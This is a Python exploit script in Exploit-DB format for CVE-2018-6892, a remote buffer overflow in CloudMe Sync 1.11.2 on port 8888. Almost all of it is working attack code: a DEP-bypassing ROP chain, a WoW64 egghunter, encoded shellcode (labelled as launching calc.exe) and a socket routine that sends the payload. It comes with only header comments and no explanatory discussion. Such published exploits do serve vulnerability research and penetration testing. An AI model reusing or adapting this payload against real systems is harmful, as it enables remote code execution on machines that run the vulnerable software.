# Exploit Title: CloudMe Sync v1.11.2 Buffer Overflow - WoW64 - (DEP Bypass)
# Date: 24.01.2019
# Exploit Author: Matteo Malvica
# Vendor Homepage:https://www.cloudme.com/en
# Software: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Category: Remote
# Contact:https://twitter.com/matteomalvica
# Version: CloudMe Sync 1.11.2
# Tested on: Windows 7 SP1 x64
# CVE-2018-6892
# Ported to WoW64 from https://www.exploit-db.com/exploits/46218 

import socket
import struct

def create_rop_chain():
	# rop chain generated with mona.py - www.corelan.be
        rop_gadgets = [
		0x61ba8b5e,  # POP EAX # RETN [Qt5Gui.dll] 
		0x690398a8,  # ptr to &VirtualProtect() [IAT Qt5Core.dll]
		0x61bdd7f5,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [Qt5Gui.dll] 
		0x68aef542,  # XCHG EAX,ESI # RETN [Qt5Core.dll] 
		0x68bfe66b,  # POP EBP # RETN [Qt5Core.dll] 
		0x68f82223,  # & jmp esp [Qt5Core.dll]
		0x6d9f7736,  # POP EDX # RETN [Qt5Sql.dll] 
		0xfffffdff,  # Value to negate, will become 0x00000201
		0x6eb47092,  # NEG EDX # RETN [libgcc_s_dw2-1.dll] 
		0x61e870e0,  # POP EBX # RETN [Qt5Gui.dll] 
		0xffffffff,  #  
		0x6204f463,  # INC EBX # RETN [Qt5Gui.dll] 
		0x68f8063c,  # ADD EBX,EDX # ADD AL,0A # RETN [Qt5Core.dll] 
		0x61ec44ae,  # POP EDX # RETN [Qt5Gui.dll] 
		0xffffffc0,  # Value to negate, will become 0x00000040
		0x6eb47092,  # NEG EDX # RETN [libgcc_s_dw2-1.dll] 
		0x61e2a807,  # POP ECX # RETN [Qt5Gui.dll] 
		0x6eb573c9,  # &Writable location [libgcc_s_dw2-1.dll]
		0x61e85d66,  # POP EDI # RETN [Qt5Gui.dll] 
		0x6d9e431c,  # RETN (ROP NOP) [Qt5Sql.dll]
		0x61ba8ce5,  # POP EAX # RETN [Qt5Gui.dll] 
		0x90909090,  # nop
		0x61b6b8d0,  # PUSHAD # RETN [Qt5Gui.dll] 
  	]
        return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()

target="127.0.0.1"
junk="A"*1052
eip = "\xfc\x57\xea\x61" #  0x61ea57fc  	
nops = "\x90\x90\x90\x90" 

egg64 = ("\x66\x8c\xcb\x80\xfb\x23\x75\x08\x31\xdb\x53\x53\x53\x53\xb3\xc0"
"\x66\x81\xca\xff\x0f\x42\x52\x80\xfb\xc0\x74\x19\x6a\x02\x58\xcd"
"\x2e\x5a\x3c\x05\x74\xea\xb8"
"\x77\x30\x30\x74"  # tag w00t
"\x89\xd7\xaf\x75\xe5\xaf\x75\xe2\xff\xe7\x6a\x26\x58\x31\xc9\x89"
"\xe2\x64\xff\x13\x5e\x5a\xeb\xdf")

#Shellcode calc.exe
payload =  b""
payload += b"\xdb\xd6\xbd\xa0\xb5\xae\xc3\xd9\x74\x24\xf4\x5b"
payload += b"\x31\xc9\xb1\x3c\x83\xc3\x04\x31\x6b\x16\x03\x6b"
payload += b"\x16\xe2\x55\x49\x46\x41\x95\xb2\x97\x26\x1c\x57"
payload += b"\xa6\x66\x7a\x13\x99\x56\x09\x71\x16\x1c\x5f\x62"
payload += b"\xad\x50\x77\x85\x06\xde\xa1\xa8\x97\x73\x91\xab"
payload += b"\x1b\x8e\xc5\x0b\x25\x41\x18\x4d\x62\xbc\xd0\x1f"
payload += b"\x3b\xca\x46\xb0\x48\x86\x5a\x3b\x02\x06\xda\xd8"
payload += b"\xd3\x29\xcb\x4e\x6f\x70\xcb\x71\xbc\x08\x42\x6a"
payload += b"\xa1\x35\x1d\x01\x11\xc1\x9c\xc3\x6b\x2a\x32\x2a"
payload += b"\x44\xd9\x4b\x6a\x63\x02\x3e\x82\x97\xbf\x38\x51"
payload += b"\xe5\x1b\xcd\x42\x4d\xef\x75\xaf\x6f\x3c\xe3\x24"
payload += b"\x63\x89\x60\x62\x60\x0c\xa5\x18\x9c\x85\x48\xcf"
payload += b"\x14\xdd\x6e\xcb\x7d\x85\x0f\x4a\xd8\x68\x30\x8c"
payload += b"\x83\xd5\x94\xc6\x2e\x01\xa5\x84\x24\xd4\x38\xb3"
payload += b"\x0b\xd6\x42\xbc\x3b\xbf\x73\x37\xd4\xb8\x8c\x92"
payload += b"\x90\x37\xc7\xbf\xb1\xdf\x81\x55\x80\xbd\x32\x80"
payload += b"\xc7\xbb\xb0\x21\xb8\x3f\xa8\x43\xbd\x04\x6f\xbf"
payload += b"\xcf\x15\x05\xbf\x7c\x15\x0c\xcf\xed\x9e\xcb\x42"
payload += b"\x81\x08\x76\xcf\x09\xe9\x1b\x6e\xa6\xc9\x98\x4a"
payload += b"\x1a\x5f\x6d\xce\xd0\x2c\xcd\x51\x71\xbe\x84\x3f"
payload += b"\x10\x33\x22\xb2\x83\xc7\xa5\x40\x18\x6c\x5c\xd6"
payload += b"\xcb\x18\xf1\x68\x50\x93\x62\xe6\x1c\x7d\x08\x80"
payload += b"\xa8\x81"

pay_load = junk+ eip + nops * 3 + rop_chain + nops*4  + egg64 + nops*4  + "w00tw00t" + payload

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(pay_load)
except:
	print "Crashed!"
